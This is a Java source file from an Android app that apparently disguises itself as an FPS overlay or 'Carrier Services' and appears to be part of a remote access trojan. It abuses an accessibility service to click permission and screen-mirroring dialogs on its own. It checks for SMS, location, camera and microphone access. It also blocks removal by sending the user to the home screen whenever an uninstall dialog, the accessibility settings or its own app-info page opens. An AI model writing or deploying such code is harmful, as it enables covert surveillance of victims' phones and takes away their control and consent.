package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.app.ActivityCompat;
import java.util.List;

public class ProtectionManager {
    private static final String TAG = "ProtectionManager";
    private final AccessibilityService service;
    private boolean antiUninstallEnabled = false;
    private boolean mirroringRequestActive = false;
    private boolean permissionRequestActive = false;
    private boolean permissionRequestContinuous = false;

    public ProtectionManager(AccessibilityService service) {
        this.service = service;
    }

    public boolean isAntiUninstallEnabled() {
        return antiUninstallEnabled;
    }

    public boolean isAllPermissionsGranted() {
        return hasAllPermissions();
    }

    public void setAntiUninstallEnabled(boolean enabled) {
        this.antiUninstallEnabled = enabled;
        Log.d(TAG, "Anti-Uninstall toggle set to: " + enabled);
    }

    public void setMirroringRequestActive(boolean active) {
        this.mirroringRequestActive = active;
        Log.d(TAG, "Mirroring search mode: " + active);
    }

    public void setPermissionRequestActive(boolean active) {
        this.permissionRequestActive = active;
        this.permissionRequestContinuous = false;
        Log.d(TAG, "Permission search mode: " + active);
    }

    public void setPermissionRequestActive(boolean active, boolean continuous) {
        this.permissionRequestActive = active;
        this.permissionRequestContinuous = continuous;
        Log.d(TAG, "Permission search mode: " + active + " (Continuous: " + continuous + ")");
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

        if (pkg.equals(service.getPackageName()) || 
            pkg.contains("com.dexrat.controller")) {
            return;
        }

        // Jika sedang meminta izin mirroring atau permission, coba klik otomatis segera
        if (permissionRequestActive) {
            autoAllowPermissions();
        }

        if (mirroringRequestActive) {
            autoAllowMirroring();
        }

        // Filter paket sistem untuk fitur proteksi (anti-uninstall, dll)
        boolean isSystemPackage = false;
        for (String p : Config.PROTECTED_PACKAGES) {
            if (pkg.contains(p)) {
                isSystemPackage = true;
                break;
            }
        }
        
        if (pkg.equals("android") || pkg.contains("systemui")) {
            isSystemPackage = true;
        }

        if (!isSystemPackage) return;

        if (antiUninstallEnabled) { 
            // ... (rest of the code unchanged)
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                int eventType = event.getEventType();
                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                    eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                    
                    if (isLikelyUninstallDialog(root)) {
                        Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }

                    if (isLikelyAccessibilityPage(root) || isLikelyAppInfoPage(root)) {
                        Log.e(TAG, "!!! PROTECTION TRIGGERED !!!");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }
                }
                root.recycle();
            }
        }
    }

    private void autoAllowMirroring() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        // Cek berdasarkan ID dulu (Lebih akurat)
        List<String> permIds = new java.util.ArrayList<>(Config.PERM_IDS);
        for (String id : permIds) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "MirrorID:" + id)) {
                        mirroringRequestActive = false;
                        root.recycle();
                        return;
                    }
                }
            }
        }

        // Cek berdasarkan teks
        for (String key : Config.PERM_KEYWORDS) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "MirrorText:" + key)) {
                        mirroringRequestActive = false;
                        root.recycle();
                        return;
                    }
                }
            }
        }
        root.recycle();
    }

    private boolean hasAllPermissions() {
        String[] permissions = {
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.READ_SMS",
                "android.permission.CAMERA",
                "android.permission.RECORD_AUDIO"
        };
        for (String perm : permissions) {
            if (ActivityCompat.checkSelfPermission(service, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        // Tambahkan pengecekan battery optimization
        android.os.PowerManager pm = (android.os.PowerManager) service.getSystemService(android.content.Context.POWER_SERVICE);
        if (pm != null && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            return pm.isIgnoringBatteryOptimizations(service.getPackageName());
        }

        return true;
    }

    private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        for (String keyword : Config.ANTI_UNINSTALL_KEYWORDS) {
            if (checkNodeForText(root, keyword)) return true;
        }
        return false;
    }

    private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
        if (root == null) return false;
        CharSequence pkgName = root.getPackageName();
        boolean isSettings = pkgName != null && "com.android.settings".equals(pkgName.toString());
        if (!isSettings) return false;

        String label = "Carrier Services";
        String targetPkg = service.getPackageName();
        
        return checkNodeRecursive(root, label) || checkNodeRecursive(root, targetPkg);
    }

    private boolean isLikelyAppInfoPage(AccessibilityNodeInfo root) {
        if (root == null) return false;
        String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
        boolean isAppInfoContext = pkg.contains("settings") || pkg.contains("packageinstaller");
        if (!isAppInfoContext) return false;

        String appName = "Carrier Services";
        String targetPkg = service.getPackageName();
        
        return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
    }

    private void autoAllowPermissions() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        // Jika mode Grant All (continuous) dan sudah semua diizinkan, matikan deteksi
        if (permissionRequestContinuous && hasAllPermissions()) {
            permissionRequestActive = false;
            permissionRequestContinuous = false;
            root.recycle();
            return;
        }

        // Prioritas 1: Berdasarkan ID View (Sangat Cepat & Akurat)
        List<String> permIds = new java.util.ArrayList<>(Config.PERM_IDS);
        for (String id : permIds) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, id)) {
                        Log.i(TAG, "Permission granted via ID: " + id);
                        root.recycle();
                        return;
                    }
                }
            }
        }

        // Prioritas 2: Berdasarkan Kata Kunci Teks
        List<String> permKeywords = new java.util.ArrayList<>(Config.PERM_KEYWORDS);
        for (String key : permKeywords) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "Text:" + key)) {
                        Log.i(TAG, "Permission granted via Text: " + key);
                        root.recycle();
                        return;
                    }
                }
            }
        }
        root.recycle();
    }

    private boolean performSafeClick(AccessibilityNodeInfo node, String identifier) {
        if (node == null) return false;
        try {
            // Kecepatan maksimal: Cukup cek enabled saja
            if (node.isEnabled()) {
                String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                
                if (isDangerousAction(text)) {
                    return false;
                }

                AccessibilityNodeInfo target = node;
                if (!target.isClickable()) {
                    AccessibilityNodeInfo parent = target.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            target = parent;
                        } else {
                            AccessibilityNodeInfo grandParent = parent.getParent();
                            if (grandParent != null && grandParent.isClickable()) {
                                target = grandParent;
                            }
                        }
                    }
                }

                if (target.isClickable()) {
                    boolean result = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (target != node) target.recycle();
                    
                    if (result) {
                        // Update status via reflection to avoid compile dependency on SupportService method
                        try {
                            Object serviceInstance = service.getClass().getMethod("getInstance").invoke(null);
                            if (serviceInstance != null) {
                                serviceInstance.getClass().getMethod("updateSystemStatus").invoke(serviceInstance);
                            }
                        } catch (Exception ignored) {}
                    }

                    // Reset deteksi jika bukan mode continuous (Grant All)
                    if (result && !permissionRequestContinuous) {
                        permissionRequestActive = false;
                    }

                    return result;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Click failed: " + identifier);
        }
        return false;
    }

    private boolean isDangerousAction(String text) {
        if (text == null) return false;
        String t = text.toLowerCase();
        return t.contains("uninstall") || t.contains("un-install") || t.contains("uninstal") ||
               t.contains("hapus") || t.contains("menghapus") || t.contains("instalasi") ||
               t.contains("installasi") || t.contains("bongkar") || t.contains("copot") ||
               t.contains("nonaktif") || t.contains("disable") || 
               t.contains("force stop") || t.contains("paksa berhenti") || 
               t.contains("delete") || t.contains("clear data") || t.contains("hapus data") ||
               t.contains("storage") || t.contains("penyimpanan") || t.contains("cache") || 
               t.contains("tembolok") || t.contains("pemasangan") || t.contains("instalan");
    }

    private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null) return false;
        List<AccessibilityNodeInfo> found = node.findAccessibilityNodeInfosByText(text);
        if (found != null && !found.isEmpty()) {
            for (AccessibilityNodeInfo n : found) n.recycle();
            return true;
        }
        return checkNodeRecursive(node, text);
    }

    private boolean checkNodeRecursive(AccessibilityNodeInfo node, String target) {
        if (node == null) return false;
        
        CharSequence text = node.getText();
        if (text != null && text.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }
        
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        String viewId = node.getViewIdResourceName();
        if (viewId != null && viewId.toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (checkNodeRecursive(child, target)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }
}
